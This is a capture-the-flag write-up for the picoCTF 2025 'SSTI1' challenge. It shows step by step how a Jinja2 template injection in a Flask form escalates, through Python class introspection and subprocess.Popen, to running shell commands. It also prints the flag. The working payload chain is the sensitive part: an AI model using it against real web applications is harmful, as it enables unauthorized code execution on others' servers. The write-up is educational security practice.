# SSTI1 - picoCTF 2025

## Challenge Information

- **Challenge Name:** SSTI1
- **Category:** Web Exploitation
- **Difficulty:** Easy
- **Platform:** picoCTF 2025
- **Author:** Venax

## Objective

Identify and exploit a Server-Side Template Injection (SSTI) vulnerability in the provided web application to execute commands on the server and retrieve the flag.

## Reconnaissance

The challenge provided a website that allowed users to submit an announcement through a form.

The page contained a user-controlled input field:

    <form action="/" method="POST">
    What do you want to announce: <input name="content" id="announce">
    <button type="submit"> Ok </button>
    </form>

The application accepted user input through the `content` parameter and rendered the submitted announcement.

## Analysis

### Detecting SSTI

The first test was a generic template injection payload:

    ${{<%[%'"}}%\

This caused an Internal Server Error, suggesting that the input was being processed by a backend component instead of being treated as plain text.

To confirm template evaluation, the following payload was tested:

    #{7*7}

The application returned:

    #{7*7}

This indicated that this syntax was not interpreted by the template engine.

A different template expression was tested:

    {{7*7}}

The response was:

    49

This confirmed that the application was evaluating user input as a server-side template expression, proving the existence of a Server-Side Template Injection vulnerability.

## Enumeration

### Identifying the Template Engine

The Flask configuration object was tested:

    {{config}}

The application returned:

    <Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': None, ...}>

This revealed that the application was using Flask with the Jinja2 template engine.

Additional context objects were tested:

    {{request}}

Returned:

    <Request 'http://rescued-float.picoctf.net:62584/announce' [POST]>

This confirmed that Flask request objects were accessible from the template context.

Testing:

    {{self}}

Returned:

    <TemplateReference None>

This confirmed access to native Jinja2 template objects.

## Exploitation

### Accessing Python Internals

Since Jinja2 allowed Python object interaction, Python object relationships were explored.

The following payload was used:

    {{''.__class__}}

Returned:

    str

This confirmed access to Python object attributes.

The method resolution order was inspected:

    {{''.__class__.__mro__}}

Returned:

    (<class 'str'>, <class 'object'>)

This showed that the base Python object class could be reached.

The subclasses of the base object were enumerated:

    {{''.__class__.__mro__[1].__subclasses__()}}

This returned a large list of loaded Python classes.

Among the returned classes was:

    <class 'subprocess.Popen>

### Finding subprocess.Popen

The class index was identified as:

    356

Testing:

    {{''.__class__.__mro__[1].__subclasses__()[356]}}

Returned:

    <class 'subprocess.Popen'>

This confirmed that the SSTI vulnerability could access Python's process execution functionality.

### Executing Commands

An initial command execution attempt:

    {{''.__class__.__mro__[1].__subclasses__()[356]("ls")}}

Returned a Popen object:

    <subprocess.Popen object at 0x72f91930d8e0>

This showed that the command was executed, but the output was not captured.

The Popen class was inspected:

    {{''.__class__.__mro__[1].__subclasses__()[356].__dict__}}

The output revealed the `communicate()` method and information about stdout handling.

A new payload was tested with stdout capture enabled:

    {{''.__class__.__mro__[1].__subclasses__()[356]("ls",stdout=-1).communicate()}}

The result was:

    (b'__pycache__\napp.py\nflag\nrequirements.txt\n', None)

This revealed a file named:

    flag

A final adjustment was required because the command needed to execute through the shell:

    {{''.__class__.__mro__[1].__subclasses__()[356]('cat flag',shell=True,stdout=-1).communicate()}}

The command successfully returned the flag.

## Flag

The flag was successfully obtained:

    picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}

## Lessons Learned

- User-controlled input should never be directly passed into server-side template rendering.
- SSTI vulnerabilities can allow attackers to move from simple template evaluation to full server-side code execution.
- Identifying the template engine is an important step because exploitation techniques depend on the engine implementation.
- Flask and Jinja2 expose objects such as `config` and `request` by default, which can provide additional attack surface.
- Python object introspection features such as `__class__`, `__mro__`, and `__subclasses__()` can expose powerful internal functionality when improperly reachable.
- `subprocess.Popen` can be dangerous when accessible because it allows interaction with the underlying operating system.

## Key Takeaways

- Always test user-controlled template inputs for expression evaluation.
- A response such as `49` from `{{7*7}}` is a strong indicator of SSTI.
- Understanding the underlying language runtime is more valuable than memorizing payloads.
- SSTI exploitation requires combining knowledge of:
  - Web application behavior
  - Template engines
  - Framework internals
  - Programming language object models
- Enumeration and understanding the environment are critical before attempting exploitation.
